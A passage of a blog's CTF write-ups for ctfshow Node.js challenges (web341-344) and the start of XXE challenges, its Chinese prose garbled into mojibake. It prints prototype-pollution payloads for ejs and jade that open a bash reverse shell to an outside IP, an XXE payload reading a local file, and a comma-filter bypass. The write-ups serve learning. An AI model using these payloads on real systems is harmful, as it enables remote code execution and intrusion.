0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è§£æ³•å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œå…ˆæ±¡æŸ“/login,ç„¶ååœ¨è®¿é—®/api</p><h2 id="web341-ä¸¤å±‚æ±¡æŸ“åŠ ejs"><a href="#web341-ä¸¤å±‚æ±¡æŸ“åŠ ejs" class="headerlink" title="web341(ä¸¤å±‚æ±¡æŸ“åŠ ejs)"></a>web341(ä¸¤å±‚æ±¡æŸ“åŠ ejs)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230201193633584.png" alt="image-20230201193633584"></p><p>è¿™é¢˜å’Œå…¶ä»–ä¸åŒçš„æ˜¯æ²¡æœ‰ <code>/api</code> æ¥å£è§¦å‘æ±¡æŸ“ç‚¹äº†ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>ejs</code> RCEã€‚</p><p>ç„¶ååƒ web340 ä¸€æ ·æ±¡æŸ“è¦å¥—ä¸¤å±‚ã€‚ä¸‹é¢ EXP ä¹ŸæœåŠ¡å™¨ç›‘å¬ç«¯å£æ˜¯ <code>9999</code></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦æ±¡æŸ“ä¸¤å±‚çš„åŸå› </p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ï¼Œrenderè§¦å‘ç”±<strong>api.js</strong>æ”¹åˆ°äº†<strong>index.js</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.111/11111 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå»æ±¡æŸ“/loginï¼Œç„¶åå†å»æŠ“index.jsçš„åŒ…ï¼Œè§¦å‘render</p><p><img src="../images/image-20230201205016149.png" alt="image-20230201205016149"></p><h2 id="web342-jadeæ¨¡æ¿æ¸²æŸ“"><a href="#web342-jadeæ¨¡æ¿æ¸²æŸ“" class="headerlink" title="web342(jadeæ¨¡æ¿æ¸²æŸ“)"></a>web342(jadeæ¨¡æ¿æ¸²æŸ“)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230201205558380.png" alt="image-20230201205558380"></p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123;<span class="attr">title</span>:<span class="string">&#x27;ctfshow&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜éš¾åº¦å¤ªå¤§ï¼Œçœ‹ç€wpéƒ½çœ‹ä¸æ‡‚ï¼Œç›´æ¥æ‹¿payloadæ‰“å°±è¡Œäº†</p><p><a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">åˆ«çš„å¸ˆå‚…å†™çš„è¶…è¯¦ç»†wp</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ</a></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•å’Œejsæ¸²æŸ“ä¸€æ ·</p><h2 id="web343-jadeæ¨¡æ¿æ¸²æŸ“-åŠ äº†è¿‡æ»¤"><a href="#web343-jadeæ¨¡æ¿æ¸²æŸ“-åŠ äº†è¿‡æ»¤" class="headerlink" title="web343(jadeæ¨¡æ¿æ¸²æŸ“  åŠ äº†è¿‡æ»¤)"></a>web343(jadeæ¨¡æ¿æ¸²æŸ“  åŠ äº†è¿‡æ»¤)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230201211333400.png" alt="image-20230201211333400"></p><p>æºç </p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">match</span>(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·</p><h2 id="web344"><a href="#web344" class="headerlink" title="web344()"></a>web344()</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230201211803497.png" alt="image-20230201211803497"></p><p>é¢˜ç›®ç»™çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ­£å¸¸å°±æ˜¯è¿™æ ·ï¼š<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>ï¼Œä½†æ˜¯ä¸è¡Œï¼Œå‘ç°æŠŠé€—å·ç»™è¿‡æ»¤äº†</p><p>HTTPåè®®ä¸­å…è®¸åŒåå‚æ•°å‡ºç°å¤šæ¬¡ï¼Œä¸åŒæœåŠ¡ç«¯å¯¹åŒåå‚æ•°å¤„ç†éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸‹é¢é“¾æ¥åˆ—ä¸¾äº†ä¸€äº›</p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p><p>nodejs ä¼šæŠŠåŒåå‚æ•°ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨ï¼Œå¹¶ä¸” <code>JSON.parse</code> å¯ä»¥æ­£å¸¸è§£æã€‚</p><p>è¿™æ ·ä¼ ï¼š<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;%22name%<span class="number">22</span>:%22admin%<span class="number">22</span>&amp;query=%22password%<span class="number">22</span>:%<span class="number">22</span>%63tfshow%<span class="number">22</span>&amp;query=%22isVIP%<span class="number">22</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°±æ˜¯node.jså¤„ç†req.query.queryçš„æ—¶å€™ï¼Œå®ƒä¸åƒphpé‚£æ ·ï¼Œåé¢getä¼ çš„queryå€¼ä¼šè¦†ç›–å‰é¢çš„ï¼Œè€Œæ˜¯ä¼šæŠŠè¿™äº›å€¼éƒ½æ”¾è¿›ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è€ŒJSON.parseå±…ç„¶ä¼šæŠŠæ•°ç»„ä¸­çš„å­—ç¬¦ä¸²éƒ½æ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå†çœ‹æ»¡ä¸æ»¡è¶³æ ¼å¼ï¼Œæ»¡è¶³å°±è¿›è¡Œè§£æï¼Œå› æ­¤è¿™æ ·åˆ†å¼€æ¥ä¼ å°±å¯ä»¥ç»•è¿‡é€—å·äº†ã€‚è‡³äºcé‚£ä¸ªä¹‹æ‰€ä»¥è¦å†è¿›è¡Œurlç¼–ç æˆ%63,å°±æ˜¯å› ä¸ºå‰é¢çš„%22ï¼Œä¼šé€ æˆ%22cï¼Œæ­£å¥½banäº†2cï¼Œæ‰€ä»¥cä¹Ÿéœ€è¦è¿›è¡Œurlç¼–ç ã€‚å­¦åˆ°äº†å­¦åˆ°äº†ï¼Œå¾ˆæœ‰æ„æ€çš„ç‰¹æ€§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow nodejs åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xxe åˆ·é¢˜è®°å½•</title>
      <link href="/posts/93a17fc8.html"/>
      <url>/posts/93a17fc8.html</url>
      
        <content type="html"><![CDATA[<p>xxeçš„è§£é‡Š  â€”-&gt;   <a href="https://xz.aliyun.com/t/3357#toc-24">è¿™ç¯‡æ–‡ç« </a>   â€”-&gt;è®²çš„æ¯”è¾ƒè¯¦ç»†äº†ï¼Œå‡ ä¹è¦†ç›–äº†xxeçš„æ‰€æœ‰æ”»å‡»æ–¹æ³•</p><p><a href="https://security.tencent.com/index.php/blog/msg/69">è¿™ç¯‡æ–‡ç« å†™çš„ä¹Ÿä¸é”™</a> â€”-&gt;  ä¹Ÿæ˜¯å¯¹xxeæ”»å‡»çš„è§£é‡Šå’Œä»‹ç»</p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230123174724507.png" alt="image-20230123174724507"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å…è®¸åŠ è½½å¤–éƒ¨å®ä½“</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// xmlæ–‡ä»¶æ¥æºäºæ•°æ®æµ</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  <span class="comment">// åŠ è½½xmlå®ä½“ï¼Œå‚æ•°ä¸ºæ›¿ä»£å®ä½“ã€åŠ è½½å¤–éƒ¨å­é›†</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  <span class="comment">// æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">  <span class="comment">// èŠ‚ç‚¹åµŒå¥—</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºphpä¸ºåè®®  <code>php://input</code>çš„ä½œç”¨ï¼Œè¯•æ‰€ä»¥æˆ‘ä»¬å¾—è¿›è¡Œpostå‘åŒ…ã€‚</p><p>å¾—ç”¨bp,hackbarä¸è¡Œ</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">payload</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">payload</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç é‡Œçš„payload  xxe  creds å¯ä»¥æ ¹æ®è‡ªå·±çš„æƒ…å†µè¿›è¡Œä¿®æ”¹ï¼Œä¸ä¼šå½±å“æœ€ç»ˆçš„ç»“æœ</p><p><code>ctfshow</code>æ˜¯ä¸èƒ½è¿›è¡Œä¿®æ”¹çš„   å› ä¸ºé¢˜ç›®çš„<code>echo $ctfshow</code>å¾—éœ€è¦<code>ctfshow</code></p><p>ä½†æ˜¯åœ¨<code>ENTITY</code>é‡Œçš„<code>xxe</code>å¿…é¡»å¾—å’Œå¤–è¾¹çš„<code>&amp;xxe;</code>ç›¸ç­‰</p><p><img src="../images/image-20230123180043163.png" alt="image-20230123180043163"></p><p>å†™è¿›å»çš„æ—¶å€™å¿…é¡»å¾—ç©ºä¸€æ ¼ï¼Œå› ä¸ºè¿™ä¸ªå¯èƒ½æ˜¯ä¸ªè¯­æ³•è¦æ±‚ã€‚</p><h2 id="web374-376-è¿‡æ»¤äº†xml"><a href="#web374-376-è¿‡æ»¤äº†xml" class="headerlink" title="web374-376(è¿‡æ»¤äº†xml)"></a>web374-376(è¿‡æ»¤äº†xml)</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 